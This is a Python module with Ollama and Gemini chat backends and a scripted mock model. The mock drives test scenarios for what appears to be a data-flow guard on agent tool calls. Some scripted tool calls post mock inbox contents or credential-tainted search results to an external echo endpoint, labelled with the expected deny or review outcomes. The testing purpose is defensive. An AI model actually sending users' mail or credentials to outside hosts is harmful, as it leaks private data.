from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import uuid
from typing import Any, AsyncIterator

_gemini_semaphore = asyncio.Semaphore(2)
_log = logging.getLogger(__name__)


async def _gemini_call_with_retry(coro_fn, *args, max_retries: int = 6, **kwargs):
    """Run an async Gemini SDK call with exponential backoff on rate-limit errors."""
    delay = 5.0
    for attempt in range(max_retries):
        try:
            async with _gemini_semaphore:
                return await coro_fn(*args, **kwargs)
        except Exception as exc:
            msg = str(exc).lower()
            is_rate_limit = "429" in msg or "resource_exhausted" in msg or "quota" in msg
            if not is_rate_limit or attempt == max_retries - 1:
                raise
            jitter = delay * 0.2
            wait = delay + (uuid.uuid4().int % 1000) / 1000 * jitter
            _log.warning("Gemini rate limit hit, retrying in %.1fs (attempt %d/%d)", wait, attempt + 1, max_retries)
            await asyncio.sleep(wait)
            delay = min(delay * 2, 60.0)

import httpx


def _artifact_ids_from_messages(messages: list[dict[str, Any]]) -> list[str]:
    ids: list[str] = []
    for m in messages:
        if m.get("role") != "tool":
            continue
        c = str(m.get("content", ""))
        m2 = re.search(r"\[\[artifacts:([^\]]+)\]\]", c)
        if m2:
            ids.extend(x.strip() for x in m2.group(1).split(",") if x.strip())
    return ids


def _norm_tool_calls(raw: Any) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    if not raw:
        return out
    for tc in raw:
        fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", None)
        if isinstance(fn, dict):
            name = fn.get("name", "")
            args = fn.get("arguments", {})
            if isinstance(args, str):
                try:
                    args = json.loads(args) if args.strip() else {}
                except json.JSONDecodeError:
                    args = {}
        else:
            name = getattr(fn, "name", "")
            args = getattr(fn, "arguments", {})
            if isinstance(args, str):
                try:
                    args = json.loads(args) if args.strip() else {}
                except json.JSONDecodeError:
                    args = {}
        out.append({"id": tc.get("id", ""), "name": name, "arguments": args})
    return out


class OllamaLLM:
    def __init__(self, model: str | None = None, base_url: str | None = None) -> None:
        self.model = model or os.environ.get("OLLAMA_MODEL", "llama3.2")
        self.base_url = (base_url or os.environ.get("OLLAMA_BASE_URL", "http://127.0.0.1:11434")).rstrip("/")

    async def chat(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]] | None) -> dict[str, Any]:
        payload: dict[str, Any] = {"model": self.model, "messages": messages, "stream": False}
        if tools:
            payload["tools"] = tools
        async with httpx.AsyncClient(timeout=120.0) as client:
            r = await client.post(f"{self.base_url}/api/chat", json=payload)
            r.raise_for_status()
            data = r.json()
        msg = data.get("message") or {}
        return {
            "content": msg.get("content") or "",
            "tool_calls": _norm_tool_calls(msg.get("tool_calls")),
        }


class GeminiLLM:
    """Gemini LLM using google-generativeai SDK.

    Maintains Gemini-native message history internally.
    Exposed via chat() for single-turn use and stream_chat() for streaming.
    """

    CONTEXT_WINDOWS: dict[str, int] = {
        "gemini-2.5-flash": 1_048_576,
        "gemini-2.5-pro": 2_097_152,
        "gemini-2.0-flash": 1_048_576,
        "gemini-1.5-pro": 2_097_152,
        "gemini-1.5-flash": 1_048_576,
        "gemini-2.0-flash-lite": 1_048_576,
    }

    def __init__(self, model_name: str = "gemini-2.5-flash", api_key: str | None = None) -> None:
        import google.generativeai as genai  # lazy import

        api_key = api_key or os.environ.get("GEMINI_API_KEY", "")
        genai.configure(api_key=api_key)
        self._genai = genai
        self.model_name = model_name
        self.context_window = self.CONTEXT_WINDOWS.get(model_name, 1_048_576)
        self.last_token_count: int = 0

    # ------------------------------------------------------------------ helpers

    def _to_gemini_tools(self, tools_openai: list[dict[str, Any]]) -> list[dict[str, Any]]:
        """Convert OpenAI tools schema to Gemini function_declarations format."""
        fn_decls = []
        for t in tools_openai:
            fn = t.get("function", {})
            fn_decls.append(
                {
                    "name": fn["name"],
                    "description": fn.get("description", ""),
                    "parameters": fn.get("parameters", {"type": "object", "properties": {}}),
                }
            )
        return [{"function_declarations": fn_decls}]

    def _make_model(self, system_prompt: str, tools_openai: list[dict[str, Any]] | None):
        gemini_tools = self._to_gemini_tools(tools_openai) if tools_openai else None
        return self._genai.GenerativeModel(
            model_name=self.model_name,
            system_instruction=system_prompt or None,
            tools=gemini_tools,
        )

    def _parse_response(self, response: Any) -> tuple[str, list[dict[str, Any]], int]:
        """Returns (text_content, tool_calls, token_count)."""
        content = ""
        tool_calls: list[dict[str, Any]] = []
        try:
            for part in response.candidates[0].content.parts:
                if hasattr(part, "text") and part.text:
                    content += part.text
                if hasattr(part, "function_call") and part.function_call.name:
                    tool_calls.append(
                        {
                            "id": str(uuid.uuid4())[:8],
                            "name": part.function_call.name,
                            "arguments": dict(part.function_call.args),
                        }
                    )
        except (IndexError, AttributeError):
            pass
        tokens: int = 0
        try:
            tokens = response.usage_metadata.total_token_count or 0
        except AttributeError:
            pass
        self.last_token_count = tokens
        return content, tool_calls, tokens

    # ------------------------------------------------------------------ public API

    async def chat(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None,
        system_prompt: str = "",
    ) -> dict[str, Any]:
        model = self._make_model(system_prompt, tools)
        response = await _gemini_call_with_retry(model.generate_content_async, messages)
        content, tool_calls, tokens = self._parse_response(response)
        return {"content": content, "tool_calls": tool_calls, "tokens": tokens}

    async def stream_chat(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None,
        system_prompt: str = "",
    ) -> AsyncIterator[str]:
        model = self._make_model(system_prompt, tools)
        response = await _gemini_call_with_retry(model.generate_content_async, messages, stream=True)
        async for chunk in response:
            try:
                if chunk.text:
                    yield chunk.text
            except Exception:
                pass
        try:
            self.last_token_count = response.usage_metadata.total_token_count or 0
        except Exception:
            pass


def make_llm(spec: str) -> "GeminiLLM | OllamaLLM":
    """Factory: 'gemini:gemini-2.0-flash' | 'ollama:llama3.2'"""
    if ":" in spec:
        provider, model = spec.split(":", 1)
    else:
        provider, model = spec, ""
    if provider == "gemini":
        return GeminiLLM(model_name=model or "gemini-2.0-flash")
    if provider == "ollama":
        return OllamaLLM(model=model or "llama3.2")
    raise ValueError(f"Unknown LLM provider: {provider!r}")


class MockLLM:
    """Deterministic tool-calling mock for CI and eval without Ollama."""

    def __init__(self) -> None:
        self._turn = 0

    async def chat(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]] | None) -> dict[str, Any]:
        self._turn += 1
        last_user = ""
        for m in reversed(messages):
            if m.get("role") == "user":
                c = m.get("content", "")
                last_user = c if isinstance(c, str) else str(c)
                break

        tool_calls: list[dict[str, Any]] = []
        # Inspect last tool results to chain
        has_gmail = any(
            "alice@example.com" in str(m.get("content", "")) for m in messages if m.get("role") == "tool"
        )
        has_rag = any(
            "[RAG chunk for" in str(m.get("content", "")) for m in messages if m.get("role") == "tool"
        )

        # Detect what tool was called in the most recent assistant turn
        last_tool_name = ""
        for m in reversed(messages):
            if m.get("role") == "assistant" and m.get("tool_calls"):
                tcs = m.get("tool_calls") or []
                if tcs:
                    last_tool_name = (tcs[0].get("function") or {}).get("name", "")
                break

        low = last_user.lower()
        prev_ids = _artifact_ids_from_messages(messages)
        if self._turn == 1:
            if "leak" in low or "exfil" in low:
                tool_calls.append({"id": "1", "name": "fetch_gmail_mock", "arguments": {}})
            elif "api key" in low:
                # credential_get_hitl / credential_post_blocked: RAG → credential taint
                tool_calls.append({"id": "1", "name": "rag_search", "arguments": {"query": "api_keys"}})
            elif "rag" in low or "internal" in low:
                # internal_doc scenarios: RAG → internal_doc taint
                tool_calls.append({"id": "1", "name": "rag_search", "arguments": {"query": "roadmap"}})
            elif "status" in low:
                # safe_public_get: plain GET with no tainted artifacts
                tool_calls.append({"id": "1", "name": "http_get", "arguments": {"url": "mock://status"}})
            elif "scratch" in low:
                # unknown_outside_write_hitl: write outside allowlist with no artifact_ids
                tool_calls.append({"id": "1", "name": "write_file", "arguments": {
                    "path": "outside/scratch.txt",
                    "content": "scratch note",
                }})
            elif "read" in low or "public" in low or "faq" in low:
                # safe_public_write / public_post_external_allow: read public artifact first
                tool_calls.append({"id": "1", "name": "read_file", "arguments": {"path": "workspace/notes.txt"}})
            else:
                tool_calls.append({"id": "1", "name": "fetch_gmail_mock", "arguments": {}})
        elif self._turn == 2 and has_gmail and ("leak" in low or "post" in low or "send" in low or "exfil" in low):
            tool_calls.append(
                {
                    "id": "2",
                    "name": "http_post",
                    "arguments": {
                        "url": "https://httpbin.org/post",
                        "body": "summary: forwarding inbox snippet",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_gmail and "dump" in low:
            # pii_outside_write_blocked: PII artifact written outside allowlist → R3 DENY
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "outside/temp/dump.txt",
                        "content": "Inbox dump.",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_rag and ("verify" in low or "http get" in low):
            # credential_get_hitl: credential-tainted artifact into external GET → R2 HITL
            tool_calls.append(
                {
                    "id": "2",
                    "name": "http_get",
                    "arguments": {
                        "url": "https://httpbin.org/get",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_rag and "post" in low:
            # credential_post_blocked / internal_doc_post_hitl: RAG artifact → external POST
            tool_calls.append(
                {
                    "id": "2",
                    "name": "http_post",
                    "arguments": {
                        "url": "https://httpbin.org/post",
                        "body": "rag summary",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_rag and "archive" in low:
            # internal_doc_allowlist_write: internal_doc artifact to allowlisted path → ALLOW
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "workspace/notes/rag_notes.txt",
                        "content": "Archived internal notes.",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_rag and "write" in low:
            # rag_write_blocked: internal_doc outside allowlist → R3 DENY
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "outside/leak.txt",
                        "content": "internal notes copied from RAG",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and last_tool_name == "read_file" and "webhook" in low:
            # public_post_external_allow: public artifact posted externally → ALLOW
            tool_calls.append(
                {
                    "id": "2",
                    "name": "http_post",
                    "arguments": {
                        "url": "https://httpbin.org/post",
                        "body": "public faq summary",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and last_tool_name == "read_file" and ("copy" in low or "public" in low):
            # safe_public_write: public artifact to allowlisted path → ALLOW
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "workspace/notes/public_copy.txt",
                        "content": "Public notes copy.",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_gmail:
            # benign_inbox_save: PII to allowlisted path → R4 HITL (auto-allow)
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "workspace/notes/summary.txt",
                        "content": "Saved inbox summary (redacted).",
                        "artifact_ids": prev_ids,
                    },
                }
            )

        if tool_calls:
            return {"content": "", "tool_calls": tool_calls}
        return {"content": "Done (mock LLM).", "tool_calls": []}
